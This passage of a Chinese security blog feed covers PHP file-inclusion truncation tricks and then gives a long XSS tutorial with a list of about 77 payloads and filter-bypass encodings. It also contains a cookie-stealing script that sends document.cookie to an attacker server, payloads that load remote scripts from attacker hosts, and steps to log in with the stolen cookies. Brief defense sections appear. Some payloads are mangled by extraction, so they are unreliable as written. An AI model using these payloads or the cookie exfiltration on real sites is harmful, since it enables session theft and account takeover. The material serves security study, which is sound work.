src="/2021/10/20/day30/image-20211027143303680.png" alt="image-20211027143303680"></p><p>可以看到是文件名拼接.php，但是文件名可控导致可以截断</p><p>%00截断</p><p><img src="/2021/10/20/day30/image-20211027143522798.png" alt="image-20211027143522798"></p><h2 id="超长截断"><a href="#超长截断" class="headerlink" title="超长截断"></a>超长截断</h2><p>这个适用于于 win32 可以使用\.进行截断 和 . 进行截断</p><p>(php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows 需要长于256)</p><p>利用操作系统对目录最大长度限制，在 window 下 256 字节，linux 下 4096 字节</p><p>点截断</p><p><img src="/2021/10/20/day30/image-20211027144439694.png" alt="image-20211027144439694"></p><pre class="line-numbers language-none"><code class="language-none">http://include.moonteam.com/file02.php?file=x.jpgspan aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/20/day30/image-20211027144449845.png" alt="image-20211027144449845"></p><p>\.截断</p><pre class="line-numbers language-none"><code class="language-none">http://include.moonteam.com/file02.php?file=x.jpgspan aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/20/day30/image-20211027144532619.png" alt="image-20211027144532619"></p><p>这里我试了下/.也能截断</p><h2 id="远程文件包含截断"><a href="#远程文件包含截断" class="headerlink" title="远程文件包含截断"></a>远程文件包含截断</h2><p>适用于远程截断的字符</p><table><thead><tr><th>符号</th><th></th><th>url编码</th></tr></thead><tbody><tr><td>#</td><td></td><td>%23</td></tr><tr><td>?</td><td></td><td>%3f</td></tr><tr><td>00</td><td></td><td>%00</td></tr></tbody></table><p>以上这个字符都可以截断</p><p>allow_url_fopen =On</p><p>allow_url_include=On</p><p>这里远程用%00截断，没解析出来</p><p><img src="/2021/10/20/day30/image-20211027145120175.png" alt="image-20211027145120175"></p><p>剩余俩个可以</p><p><img src="/2021/10/20/day30/image-20211027145148513.png" alt="image-20211027145148513"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol><li>严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于<strong>被包含的文件是否可被外部控制</strong>；</li><li>路径限制：限制被包含的文件只能在某一文件内，一定要禁止目录跳转字符，如：”../“；</li><li>包含文件验证：验证被包含的文件是否是白名单中的一员；</li><li>尽 量 不 要 使 用 动 态 包 含 ， 可 以 在 需 要 包 含 的 页 面 固 定 写 好 ， 如 ：include(‘head.php’)。</li><li>设置 allow_url_include 为 Off</li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
          <category> 绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss</title>
      <link href="/2021/09/22/day29/"/>
      <url>/2021/09/22/day29/</url>
      
        <content type="html"><![CDATA[<h1 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h1><span id="more"></span><h2 id="简单认识"><a href="#简单认识" class="headerlink" title="简单认识"></a>简单认识</h2><p>XSS就是通过 HTML注入篡改网页，插入恶意脚本，从而在用户浏览网页时控制用户浏览器</p><p>如果是MVC框架，主要发生在view层中</p><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>XSS 攻击全称<strong>跨站脚本攻击</strong>，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为 XSS。</p><p>XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 web 用户将代码植入到 web 网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生 xss 攻击。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>通过特殊字符让浏览器误以为插入了HTML标签，从而引入恶意脚本在用户浏览器执行。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ol><li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li><li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li><li>盗窃企业重要的具有商业价值的资料</li><li>非法转账</li><li>强制发送电子邮件</li><li>网站挂马</li><li>控制受害者机器向其它网站发起攻击</li></ol><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li><p>Http Only</p><p>解决XSS后的cookie劫持</p></li><li><p>输入检查</p><p>过滤特殊字符</p></li><li><p>输出检查</p><p>在变量输出到HTML，可以进行编码或者转义</p></li></ol><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型 XSS，非持久化，需要欺骗用户自己去点击链接才能触发 XSS 代码。</p><p>反射型 xss 攻击的方法，攻击者通过发送邮件或诱导等方法，将包含有 xss 恶意链接发送给目标用户，当目标用户访问该链接时，服务器将接收该用户的请求并进行处理，然后服务器把带有 xss 恶意脚本发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后，就会触发 xss 攻击。</p><p><strong>分析源码</strong></p><p><img src="/2021/09/22/day29/image-20210927142651609.png" alt="image-20210927142651609"></p><p>我们直接构造标签即可</p><p>构造时发现对长度有限制，我们看看是否是前端做的限制</p><p><img src="/2021/09/22/day29/image-20210927142816864.png" alt="image-20210927142816864"></p><p>时前端做的，我们把maxlength删掉</p><p><img src="/2021/09/22/day29/image-20210927142900717.png" alt="image-20210927142900717"></p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型 XSS，持久化，代码是存储在服务器中的数据库里</p><p>如在个人信息或发表文章等地方，可以插入代码，如果插入的数据没有过滤或过滤不严，那么这些恶意代码没有经过过滤将储存到数据库中，用户访问该页面的时候，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成 xss 攻击。</p><p><strong>源码分析</strong></p><p><img src="/2021/09/22/day29/image-20210927143442659.png" alt="image-20210927143442659"></p><p>浏览器访问改页面时，插入数据库中的语句未作处理直接输出到页面</p><p><img src="/2021/09/22/day29/image-20210927143627694.png" alt="image-20210927143627694"></p><p><img src="/2021/09/22/day29/image-20210927143816959.png" alt="image-20210927143816959"></p><p>浏览器访问页面发生弹窗</p><p><img src="/2021/09/22/day29/image-20210927143831750.png" alt="image-20210927143831750"></p><h3 id="dom型XSS"><a href="#dom型XSS" class="headerlink" title="dom型XSS"></a>dom型XSS</h3><p>客户端的JavaScript脚本可以访问浏览器的DOM树并修改页面内容，不依赖服务器数据，直接从浏览器获取数据并执行</p><blockquote><p>DOM，全称 Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。</p><p>DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。</p><p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。</p><p>也就是说，客户端的脚本程序可以通过DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行。基于这个特性，就可以利用 JS 脚本来实现 XSS 漏洞的利用。</p></blockquote><p>以下是一些经常出现 dom xss 的关键语句：</p><ul><li>document.referer 属性</li><li>window.name 属性</li><li>location 属性</li><li>innerHTML 属性</li><li>documen.write 属性</li></ul><p><strong>源码分析：</strong></p><p>DOM 型 xss 程序中，只有 html 代码，dom 通过操作 HTML 或者 css 实现 HTML属性、方法、事件，因此程序中没有与服务器进行交互。</p><p><img src="/2021/09/22/day29/image-20210927144412097.png" alt="image-20210927144412097"></p><p><img src="/2021/09/22/day29/image-20210927144643598.png" alt="image-20210927144643598"></p><p>我们闭合引号构造即可，这里看出时单引号闭合</p><p>我们通过事件</p><p><img src="/2021/09/22/day29/image-20210927145755838.png" alt="image-20210927145755838"></p><p><img src="/2021/09/22/day29/image-20210927150650000.png" alt="image-20210927150650000"></p><p><img src="/2021/09/22/day29/image-20210927150700194.png" alt="image-20210927150700194"></p><p>点击即可弹窗</p><h2 id="xss测试语句"><a href="#xss测试语句" class="headerlink" title="xss测试语句"></a>xss测试语句</h2><p>在网站是否存在 xss 漏洞时，应该输入一些标签如&lt;、&gt;输入后查看网页源代码是否过滤标签，如果没过滤，很大可能存在 xss 漏洞。</p><p>常用的测试语句</p><p>&lt;h5&gt;1&lt;/h5&gt;</p><p>&lt;span&gt;1&lt;/span&gt;</p><p>&lt;script&gt;console.log(1);&lt;/script&gt;</p><p>闭合</p><p>“&gt;&lt;span&gt;x&lt;/span&gt;&lt;“</p><p>‘&gt;”&gt;&lt;span&gt;x&lt;/span&gt;&lt;‘</p><p>单行注释</p><p>“&gt;&lt;span&gt;x&lt;/span&gt;//</p><h2 id="xss攻击语句"><a href="#xss攻击语句" class="headerlink" title="xss攻击语句"></a>xss攻击语句</h2><p>输入检测确定标签没有过滤后，为了显示存在漏洞，需要插入 xss 攻击代码。</p><p>常用的语句</p><p>&lt;script&gt;alert(1)&lt;/script&gt;</p><p>&lt;svg onload=alert(1)&gt;</p><p>&lt;a href=javascript:alert(1)&gt;</p><p>&lt;a href=’javascript:alert(1)’&gt;aa&lt;/a&gt;</p><p>(1)普通的 XSS JavaScript 注入</p><p>&lt;SCRIPT SRC=<a href="http://3w.org/XSS/xss.js>/">http://3w.org/XSS/xss.js&gt;\</a></p><p>(2)IMG 标签 XSS 使用 JavaScript 命令</p><p>&lt;IMG SRC=<a href="http://3w.org/XSS/xss.js/>">http://3w.org/XSS/xss.js/&gt;</a></p><p>(3)IMG 标签无分号无引号</p><p>&lt;IMG SRC=javascript:alert(‘XSS’)&gt;</p><p>(4)IMG 标签大小写不敏感</p><p>&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;</p><p>(5)HTML 编码(必须有分号)</p><p>&lt;IMG SRC=javascript:alert(“XSS”)&gt;</p><p>(6)修正缺陷 IMG 标签</p><p>&lt;IMG “””&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;</p><p>(7)formCharCode 标签(计算器)</p><p>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</p><p>(8)UTF-8 的 Unicode 编码(计算器)</p><p>&lt;IMG SRC=jav..省略..S’)&gt;</p><p>(9)7 位的 UTF-8 的 Unicode 编码是没有分号的(计算器)&lt;IMG SRC=jav..省略..S’)&gt;</p><p>(10)十六进制编码也是没有分号(计算器)</p><p>&lt;IMG SRC=java..省略..XSS’)&gt;</p><p>(11)嵌入式标签,将 Javascript 分开</p><p>&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</p><p>(12)嵌入式编码标签,将 Javascript 分开</p><p>&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</p><p>(13)嵌入式换行符</p><p>&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</p><p>(14)嵌入式回车</p><p>&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</p><p>(15)嵌入式多行注入 JavaScript,这是 XSS 极端的例子</p><p>&lt;IMG SRC=”javascript:alert(‘XSS’)”&gt;</p><p>(16)解决限制字符(要求同页面)</p><p>&lt;script&gt;z=’document.’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’write(“‘&lt;/script&gt;</p><p>&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’src=ht’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’w.shell’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt;</p><p>&lt;script&gt;eval_r(z)&lt;/script&gt;</p><p>(17)空字符 12-7-1 T00LS - Powered by Discuz! Board</p><p><a href="https://www.a.com/viewthread.php?action=printable&amp;tid=15267">https://www.a.com/viewthread.php?action=printable&amp;tid=15267</a> 2/6perl -e ‘print “&lt;IMGSRC=java\0script:alert("XSS")&gt;”;’ &gt; out</p><p>(18)空字符 2,空字符在国内基本没效果.因为没有地方可以利用</p><p>perl -e ‘print “&lt;SCR\0IPT&gt;alert("XSS")&lt;/SCR\0IPT&gt;”;’ &gt; out</p><p>(19)Spaces 和 meta 前的 IMG 标签</p><p>&lt;IMG SRC=” javascript:alert(‘XSS’);”&gt;</p><p>(20)Non-alpha-non-digit XSS</p><p>&lt;SCRIPT/XSS SRC=”<a href="http://3w.org/XSS/xss.js&quot;>/">http://3w.org/XSS/xss.js"&gt;\</a></p><p>(21)Non-alpha-non-digit XSS to 2</p><p>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt;</p><p>(22)Non-alpha-non-digit XSS to 3</p><p>&lt;SCRIPT/SRC=”<a href="http://3w.org/XSS/xss.js&quot;>/">http://3w.org/XSS/xss.js"&gt;\</a></p><p>(23)双开括号&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</p><p>(24)无结束脚本标记(仅火狐等浏览器)</p><p>&lt;SCRIPT SRC<a href="http://3w.org/XSS/xss.js?%5C">http://3w.org/XSS/xss.js?\</a><b></b></p><p>(25)无结束脚本标记 2</p><p>&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</p><p>(26)半开的 HTML/JavaScript XSS</p><p>&lt;IMG SRC=”javascript:alert(‘XSS’)”</p><p>(27)双开角括号</p><p>&lt;iframe src=<a href="http://3w.org/XSS.html">http://3w.org/XSS.html</a> &lt;</p><p>(28)无单引号 双引号 分号</p><p>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</p><p>(29)换码过滤的 JavaScript</p><p>";alert(‘XSS’);//</p><p>(30)结束 Title 标签</p><p>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;</p><p>(31)Input Image</p><p>&lt;INPUT SRC=”javascript:alert(‘XSS’);”&gt;</p><p>(32)BODY Image</p><p>&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</p><p>(33)BODY 标签</p><p>&lt;BODY(‘XSS’)&gt;</p><p>(34)IMG Dynsrc</p><p>&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”&gt;</p><p>(35)IMG Lowsrc</p><p>&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”&gt;</p><p>(36)BGSOUND</p><p>&lt;BGSOUND SRC=”javascript:alert(‘XSS’);”&gt;</p><p>(37)STYLE sheet</p><p>&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”&gt;</p><p>(38)远程样式表</p><p>&lt;LINK REL=”stylesheet” HREF=”<a href="http://3w.org/xss.css&quot;>">http://3w.org/xss.css"&gt;</a></p><p>(39)List-style-image(列表式)</p><p>&lt;STYLE&gt;li {list-style-image: url(“javascript:alert(‘XSS’)”);}&lt;/STYLE&gt;</p><ul>&lt;LI&gt;XSS</ul><p></p><p>(40)IMG VBscript</p><p>&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</p><p>(41)META 链接 url</p><p>&lt;META HTTP-EQUIV=”refresh” CONTENT=”0;URL=http://;URL=javascript:alert(‘XSS’);”&gt;</p><p>(42)Iframe</p><p>&lt;IFRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;</p><p>(43)Frame</p><p>&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/FRAMESET&gt;12-7-1 T00LS - Powered by Discuz!</p><p>Board<a href="https://www.a.com/viewthread.php?action=printable&amp;tid=15267">https://www.a.com/viewthread.php?action=printable&amp;tid=15267</a> 3/6</p><p>(44)Table</p><p>&lt;TABLE BACKGROUND=”javascript:alert(‘XSS’)”&gt;</p><p>(45)TD</p><p>&lt;TABLE&gt;&lt;TD BACKGROUND=”javascript:alert(‘XSS’)”&gt;</p><p>(46)DIV background-image</p><p>&lt;DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”&gt;</p><p>(47)DIV background-image 后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)</p><p>&lt;DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”&gt;</p><p>(48)DIV expression</p><p>&lt;DIV STYLE=”width: expression_r(alert(‘XSS’));”&gt;</p><p>(49)STYLE 属性分拆表达</p><p>&lt;IMG STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</p><p>(50)匿名 STYLE(组成:开角号和一个字母开头)</p><p>&lt;XSS STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</p><p>(51)STYLE background-image</p><p>&lt;STYLE&gt;.XSS{background-image:url(“javascript:alert(‘XSS’)”);}&lt;/STYLE&gt;&lt;ACLASS=XSS&gt;&lt;/A&gt;</p><p>(52)IMG STYLE 方式</p><p>exppression(alert(“XSS”))’&gt;</p><p>(53)STYLE background</p><p>&lt;STYLE&gt;&lt;STYLEtype=”text/css”&gt;BODY{background:url(“javascript:alert(‘XSS’)”)}&lt;/STYLE&gt;</p><p>(54)BASE</p><p>&lt;BASE HREF=”javascript:alert(‘XSS’);//“&gt;</p><p>(55)EMBED 标签,你可以嵌入 FLASH,其中包涵 XSS</p><p>&lt;EMBED SRC=”<a href="http://3w.org/XSS/xss.swf&quot;">http://3w.org/XSS/xss.swf"</a> &gt;&lt;/EMBED&gt;</p><p>(56)在 flash 中使用 ActionScrpt 可以混进你 XSS 的代码</p><p>a=”get”;b=”URL("“;c=”javascript:”;d=”alert(‘XSS’);")”;eval_r(a+b+c+d);</p><p>(57)XML namespace.HTC 文件必须和你的 XSS 载体在一台服务器上</p><p>&lt;HTML xmlns:xss&gt;&lt;?import namespace=”xss”</p><p>implementation=”<a href="http://3w.org/XSS/xss.htc&quot;>">http://3w.org/XSS/xss.htc"&gt;</a><a href="xss:xss">xss:xss</a>XSS&lt;/xss:xss&gt;&lt;/HTML&gt;</p><p>(58)如果过滤了你的 JS 你可以在图片里添加 JS 代码来利用</p><p>&lt;SCRIPT SRC=””&gt;&lt;/SCRIPT&gt;</p><p>(59)IMG 嵌入式命令,可执行任意命令</p><p>&lt;IMG SRC=”<a href="http://www.a.com/a.php?a=b&quot;>">http://www.a.com/a.php?a=b"&gt;</a></p><p>(60)IMG 嵌入式命令(a.jpg 在同服务器)</p><p>Redirect 302 /a.jpg <a href="http://www.xxx.com/admin.asp&amp;deleteuser">http://www.XXX.com/admin.asp&amp;deleteuser</a></p><p>(61)绕符号过滤</p><p>&lt;SCRIPT a=”&gt;” SRC=”<a href="http://3w.org/xss.js&quot;>/">http://3w.org/xss.js"&gt;\</a></p><p>(62)&lt;SCRIPT =”&gt;” SRC=”<a href="http://3w.org/xss.js&quot;>/">http://3w.org/xss.js"&gt;\</a></p><p>(63)&lt;SCRIPT a=”&gt;” “ SRC=”<a href="http://3w.org/xss.js&quot;>/">http://3w.org/xss.js"&gt;\</a></p><p>(64)&lt;SCRIPT “a=’&gt;’” SRC=”<a href="http://3w.org/xss.js&quot;>/">http://3w.org/xss.js"&gt;\</a></p><p>(65)&lt;SCRIPT a=反引号&gt;反引号SRC=”<a href="http://3w.org/xss.js&quot;>/">http://3w.org/xss.js"&gt;\</a></p><p>(66)12-7-1 T00LS - Powered by Discuz! Board<a href="https://www.a.com/viewthread.php?action=printable&amp;tid=15267">https://www.a.com/viewthread.php?action=printable&amp;tid=15267</a> 4/6&lt;SCRIPT a=”&gt;’&gt;”SRC=”<a href="http://3w.org/xss.js&quot;>/">http://3w.org/xss.js"&gt;\</a></p><p>(67)&lt;SCRIPT&gt;document.write(“&lt;SCRI”);&lt;/SCRIPT&gt;PTSRC=”<a href="http://3w.org/xss.js&quot;>/">http://3w.org/xss.js"&gt;\</a></p><p>(68)URL 绕行</p><p>&lt;A HREF=”<a href="http://127.0.0.1/&quot;>XSS/">http://127.0.0.1/"&gt;XSS\</a></p><p>(69)URL 编码</p><p>&lt;A HREF=”<a href="http://3w.org&quot;>xss/">http://3w.org"&gt;XSS\</a></p><p>(70)IP 十进制</p><p>&lt;A HREF=”<a href="http://3232235521′′>xss/">http://3232235521″&gt;XSS\</a></p><p>(71)IP 十六进制</p><p>&lt;A HREF=”<a href="http://0xc0.0xa8.0×00.0×01′′>xss/">http://0xc0.0xa8.0×00.0×01″&gt;XSS\</a></p><p>(72)IP 八进制</p><p>&lt;A HREF=”<a href="http://0300.0250.0000.0001′′>xss/">http://0300.0250.0000.0001″&gt;XSS\</a></p><p>(73)混合编码</p><p>&lt;A HREF=”<a href="http://0.0.0.6/">http://6</a> 6.000146.0×7.147/“”&gt;XSS&lt;/A&gt;</p><p>(74)节省[http:]</p><p>&lt;A HREF=”//<a href="http://www.google.com/&quot;>XSS/">www.google.com/"&gt;XSS\</a></p><p>(75)节省[www]</p><p>&lt;A HREF=”<a href="http://google.com/&quot;>XSS/">http://google.com/"&gt;XSS\</a></p><p>(76)绝对点绝对 DNS</p><p>&lt;A HREF=”<a href="http://www.google.com./&quot;>XSS/">http://www.google.com./"&gt;XSS\</a></p><p>(77)javascript 链接</p><p>&lt;A HREF=”javascript:document.location=’<a href="http://www.google.com/'&quot;>XSS\">http://www.google.com/'"&gt;XSS\</a></p><h2 id="xss常见利用"><a href="#xss常见利用" class="headerlink" title="xss常见利用"></a>xss常见利用</h2><p>当发现存在 xss 漏洞时，如果只是弹出信息窗口，这样只能证明存在一个 xss 漏 洞，想再进一步深入的话，就必须学会加载 xss 攻击 payload。</p><p>同时加载 payload也要考虑到语句的长度，语句是越短越好，因为有的插入语句的长度会被限制。常见的加载攻击语句有&lt;script src=”<a href="http://192.168.0.121/xss.js&quot;>/">http://192.168.0.121/xss.js"&gt;\</a> 单引号可以去掉 &lt;script src=<a href="http://192.168.0.121/xss.js>/">http://192.168.0.121/xss.js&gt;\</a>可以变成&lt;scriptsrc=//192.168.0.121/xss.js&gt;&lt;/script&gt; 这种格式如果网站是 http 会自动加载 http，如果网站是 https 会自动变成 https。 </p><p>xss 漏洞能够通过构造恶意的 xss 语句实现很多功能，其中最常用的时，构造 xss恶意代码获取对方浏览器的 cookie。</p><p><strong>利用：</strong></p><p>我们打开kali，将一下代码保存为js文件</p><pre class="line-numbers language-none"><code class="language-none">var img=document.createElement("img");img.src="http://这里写kali的ip?"+escape(document.cookie);document.body.appendChild(img);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过sudo python -m SimpleHTTPServer 80 命令打开小型web服务</p><p><img src="/2021/09/22/day29/image-20210927152848543.png" alt="image-20210927152848543"></p><p><img src="/2021/09/22/day29/image-20210927152929135.png" alt="image-20210927152929135"></p><p>在dvwa后台插入xss代码</p><p><img src="/2021/09/22/day29/image-20210927153106702.png" alt="image-20210927153106702"></p><p>这里前端也做了长度限制，我们还是一样，把maxlength删掉即可</p><p><img src="/2021/09/22/day29/image-20210927153357563.png" alt="image-20210927153357563"></p><p>可以看到xss.js被加载了，拿到了cookie，他会发送到我们kali开启的小型服务器上</p><h2 id="加载远程攻击的-paylod"><a href="#加载远程攻击的-paylod" class="headerlink" title="加载远程攻击的 paylod"></a>加载远程攻击的 paylod</h2><h3 id="常见的标准-payload"><a href="#常见的标准-payload" class="headerlink" title="常见的标准 payload"></a>常见的标准 payload</h3><p>注意 网站采用的协议。</p><p>&lt;script src=”<a href="http://192.168.0.121/xss.js&quot;>/">http://192.168.0.121/xss.js"&gt;\</a></p><p>&lt;script src=”<a href="https://192.168.0.121/xss.js&quot;>/">https://192.168.0.121/xss.js"&gt;\</a></p><p>自动选择协议</p><p>&lt;script src=//192.168.0.121/xss.js&gt;&lt;/script&gt;</p><h3 id="图片创建加载连接"><a href="#图片创建加载连接" class="headerlink" title="图片创建加载连接"></a>图片创建加载连接</h3><p>&lt;img src=’’onerror=document.body.appendChild(document.createElement(‘script’)).src=’//192.168.0.110/xss.js’&gt;</p><h3 id="字符并接"><a href="#字符并接" class="headerlink" title="字符并接"></a>字符并接</h3><p>这种一般是输入的字符有限制的时候使用</p><p>&lt;script&gt;z=’document.’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’write(“‘&lt;/script&gt;</p><p>&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’tp://www.’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’xsstools’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’.com/a’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’mER&gt;&lt;/sc’&lt;/script&gt;</p><p>&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt;</p><p>&lt;script&gt;eval(z)&lt;/script&gt;</p><p>有的情况要用/**/注释不需要的代码。</p><h3 id="jquery-加载"><a href="#jquery-加载" class="headerlink" title="jquery 加载"></a>jquery 加载</h3><p>&lt;script&gt;$.getScript(“//<a href="http://www.xsstools.com/amER&quot;);/">www.xsstools.com/amER");\</a></p><h2 id="搭建-xss-漏洞利用平台"><a href="#搭建-xss-漏洞利用平台" class="headerlink" title="搭建 xss 漏洞利用平台"></a>搭建 xss 漏洞利用平台</h2><p>xss 漏洞利用平台,集合了 xss 攻击的多种方法，很方便快捷的利用 xss 漏洞，生成攻击代码。</p><p>利用phpstuday搭建</p><p><img src="/2021/09/22/day29/image-20210927153907425.png" alt="image-20210927153907425"></p><p><img src="/2021/09/22/day29/image-20210927154122923.png" alt="image-20210927154122923"></p><p><img src="/2021/09/22/day29/image-20210927154155556.png" alt="image-20210927154155556"></p><p><img src="/2021/09/22/day29/image-20210927154402440.png" alt="image-20210927154402440"></p><p>我们将利用代码写入</p><p><img src="/2021/09/22/day29/image-20210927154427241.png" alt="image-20210927154427241"></p><p>可以看到cookie被发送过来</p><p>我们利用cookie就可以登录，只需要在登陆时替换掉cookie即可</p><h2 id="xss编码绕过"><a href="#xss编码绕过" class="headerlink" title="xss编码绕过"></a>xss编码绕过</h2><h3 id="gpc过滤字符"><a href="#gpc过滤字符" class="headerlink" title="gpc过滤字符"></a>gpc过滤字符</h3><p>如果 gpc 开启的时候，特殊字符会被加上斜杠即，’变成\‘， xss 攻击代码不要带用单引号或双引号。</p><p>绕过 gpc，在 php 高 版本 gpc 默认是没有的，但是开发程序员会使用addcslashes()对特殊字符进行转义。</p><p>&lt;script src=’<a href="http://www.xss123.com/JGdbsl?1623638390'>\">http://www.xss123.com/JGdbsl?1623638390'&gt;\</a>这个是执行不了的</p><p>&lt;script src=<a href="http://www.xss123.com/JGdbsl?1623638390>%5C">http://www.xss123.com/JGdbsl?1623638390&gt;\</a> 没有单引号可执行。</p><h3 id="过滤alert"><a href="#过滤alert" class="headerlink" title="过滤alert"></a>过滤alert</h3><p>当页面过滤 alert 这个函数时，因为这个函数会弹窗，不仅很多程序会对他进行过滤，而且很多 waf 都会对其进行拦截。所以不存在 alert 即可</p><p>&lt;script&gt;prompt(/xss/);&lt;/script&gt;</p><p>&lt;script&gt;confirm(1);&lt;/script&gt;</p><p>&lt;script src=<a href="http://www.xss123.com/eciAKj?1623635663>%5C">http://www.xss123.com/eciAKj?1623635663&gt;\</a></p><h3 id="过滤标签"><a href="#过滤标签" class="headerlink" title="过滤标签"></a>过滤标签</h3><p>在程序里如果使用 html 实体过滤，在 php 会使用 htmlspecialchars()对输入的字符进行实体化，实体化之后的字符不会在 html 执行。</p><p>把预定义的字符 “&lt;” （小于） 和 “&gt;” （大于）转换为 HTML 实体，构造 xss 恶意代码大多数都必须使用&lt;或 者&gt;，这两个字符被实体化后在 html 里就不能执行了。</p><p><img src="/2021/09/22/day29/image-20210927155054778.png" alt="image-20210927155054778"></p><p>但是有在 input 这些标签里是不用考虑标签实体化，因为用不上&lt;&gt;这两个标签。</p><p>&lt;input type=”text” name=”username” value=”” onclick=”javascript:alert(‘xss’);”/&gt;</p><p>我们使用事件也可以造成xss</p><h3 id="ascii编码"><a href="#ascii编码" class="headerlink" title="ascii编码"></a>ascii编码</h3><p>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</p><h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p>&lt;a href=”javascript:%61%6c%65%72%74%28%32%29”&gt;123&lt;/a&gt;</p><h3 id="js编码"><a href="#js编码" class="headerlink" title="js编码"></a>js编码</h3><p><a href="https://www.jb51.net/tools/zhuanhuan.htm">https://www.jb51.net/tools/zhuanhuan.htm</a></p><p><img src="/2021/09/22/day29/image-20210927155302828.png" alt="image-20210927155302828"></p><p>八进制编码</p><p>&lt;script&gt;eval(“\141\154\145\162\164\50\61\51”);&lt;/script&gt;</p><p>十六进制编码</p><p>&lt;script&gt;eval(“\x61\x6c\x65\x72\x74\x28\x31\x29”)&lt;/script&gt;</p><p>jsunicode编码</p><p>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(‘xss’);&lt;/script&gt;</p><h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><p>在=后可以解析 html 编码</p><p>十进制</p><pre class="line-numbers language-none"><code class="language-none">&lt;img src="x"onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>十六进制</p><pre class="line-numbers language-none"><code class="language-none">&lt;img 